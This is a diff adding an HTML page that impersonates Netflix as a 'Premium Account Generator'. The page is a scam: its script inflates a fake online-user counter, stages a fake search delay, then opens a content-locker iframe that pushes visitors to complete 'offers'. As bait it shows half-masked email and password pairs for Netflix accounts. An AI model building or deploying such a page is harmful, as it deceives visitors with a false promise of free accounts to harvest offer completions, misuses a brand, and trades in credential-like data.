@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Premium Account Generator</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://dnm.nflximg.net/api/v6/BvVbc2Wxr2w6QuoANoSpJKEIWjQ/AAAAQdHbjrX0uL1mH7uUW7VZ-p5GJOSNNRko_9A_12Mlv5wVYQIDy4nuupxLHxkDj9V0e1OLBs_s8ZlxFkyhPlK5XkrlTK0c7yP42LLinQdYhz8lqfgUcOH68JAbEcY45jG02gCI1NyKVf1lqxsQFmcNN5szbv8.jpg?r=aee') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: white;
+    }
+
+    .container {
+      background-color: rgba(0, 0, 0, 0.8);
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      width: 400px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+      animation: slideIn 1s ease-in-out;
+    }
+
+    .logo {
+      width: 150px;
+      margin-bottom: 20px;
+      transition: transform 0.3s ease;
+    }
+
+    .logo:hover {
+      transform: scale(1.1);
+    }
+
+    .title {
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      animation: fadeIn 2s;
+    }
+
+    .status-section {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .status-item {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 10px;
+      font-size: 16px;
+    }
+
+    .online-users {
+      font-weight: bold;
+      font-size: 18px;
+      transition: color 0.5s ease;
+    }
+
+    .input-section {
+      margin-bottom: 20px;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      margin-bottom: 10px;
+      outline: none;
+      transition: border 0.3s;
+    }
+
+    input[type="email"]:focus {
+      border: 2px solid #e50914;
+    }
+
+    button {
+      background-color: #e50914;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s, transform 0.2s;
+    }
+
+    button:hover {
+      background-color: #f40612;
+      transform: scale(1.1);
+    }
+
+    @keyframes fadeIn {
+      0% {
+        opacity: 0;
+      }
+      100% {
+        opacity: 1;
+      }
+    }
+
+    @keyframes slideIn {
+      0% {
+        transform: translateY(-50px);
+        opacity: 0;
+      }
+      100% {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    /* Content Locker Styles */
+    #content-locker {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      animation: fadeIn 1s;
+    }
+
+    .content-locker-inner {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      width: 400px;
+    }
+
+    .content-locker-inner h2 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    .content-locker-inner p {
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    .close-locker {
+      background-color: #e50914;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    #email-password-container {
+      margin-top: 20px;
+      font-size: 18px;
+      display: none;
+    }
+
+    #continue-btn {
+      background-color: #4CAF50;
+      margin-top: 20px;
+    }
+
+    #message-container {
+      margin-top: 20px;
+      font-size: 18px;
+      display: none;
+      text-align: center;
+    }
+
+    /* New Animation for "Online" status color change */
+    .status-value {
+      animation: colorChange 1s infinite alternate;
+    }
+
+    @keyframes colorChange {
+      0% {
+        color: green;
+      }
+      100% {
+        color: red;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix Logo" class="logo">
+    <div class="title">Premium Account Generator</div>
+    <div class="status-section">
+      <div class="status-item">
+        <div>Status:</div>
+        <div class="status-value" id="status-online">Online</div>
+      </div>
+      <div class="status-item">
+        <div>Last Update:</div>
+        <div>08/11/2024</div>
+      </div>
+      <div class="status-item">
+        <div>Online Users:</div>
+        <div class="online-users" id="onlineCount">200</div>
+      </div>
+    </div>
+    <div class="input-section">
+      <label for="email">Enter Your Email:</label>
+      <input type="email" id="email" placeholder="you@example.com">
+    </div>
+    <button id="getPremiumBtn">Get Your Free Premium</button>
+    <div id="status-message" style="color: #e50914; font-weight: bold; display: none;">Searching in progress...</div>
+    <div id="message-container">
+      <div>Continue to get the free account</div>
+      <button id="continue-btn">Continue</button>
+    </div>
+    <div id="email-password-container">
+      <div id="email-display"></div>
+      <div id="password-display"></div>
+    </div>
+  </div>
+
+  <!-- Content Locker -->
+  <div id="content-locker">
+    <div class="content-locker-inner">
+      <h2>Complete an Offer to Get Your Free Premium</h2>
+      <p>To unlock your prize, please complete one of the following offers:</p>
+      <iframe src="https://contentlocked.net/cl/i/ponv4n" width="100%" height="300px"></iframe><br><br>
+      <button class="close-locker" onclick="closeLocker()">Close</button>
+    </div>
+  </div>
+
+  <script>
+    const emailsAndPasswords = [
+      { email: "manikandan_kandarpa612@gmail.com", password: "rohia61238" },
+      { email: "asutosh_kuruvilla@gmail.com", password: "aditilla28" },
+      { email: "shweta_dewangan@gmail.com", password: "advangan47" },
+    ];
+
+    function getRandomEmailPassword() {
+      const randomIndex = Math.floor(Math.random() * emailsAndPasswords.length);
+      return emailsAndPasswords[randomIndex];
+    }
+
+    function displayHalfEmailAndPassword() {
+      const { email, password } = getRandomEmailPassword();
+      const halfEmail = email.slice(0, email.length / 2) + "*****" + email.slice(email.indexOf('@'));
+      const halfPassword = password.slice(0, 3) + "*****";
+      document.getElementById("email-display").textContent = "Email: " + halfEmail;
+      document.getElementById("password-display").textContent = "Password: " + halfPassword;
+    }
+
+    let onlineCount = 200;
+    function updateOnlineCount() {
+      onlineCount += Math.floor(Math.random() * 10);
+      document.getElementById("onlineCount").textContent = onlineCount;
+    }
+
+    setInterval(updateOnlineCount, Math.floor(Math.random() * 2000) + 1000); // Update every 1-2 seconds
+
+    document.getElementById("getPremiumBtn").addEventListener("click", function () {
+      document.getElementById("status-message").style.display = "block";
+      setTimeout(function () {
+        document.getElementById("status-message").style.display = "none";
+        document.getElementById("message-container").style.display = "block";
+      }, 3000);
+    });
+
+    document.getElementById("continue-btn").addEventListener("click", function () {
+      document.getElementById("message-container").style.display = "none";
+      document.getElementById("content-locker").style.display = "flex";
+      displayHalfEmailAndPassword();
+      document.getElementById("email-password-container").style.display = "block";
+    });
+
+    function closeLocker() {
+      document.getElementById("content-locker").style.display = "none";
+    }
+  </script>
+</body>
+</html>
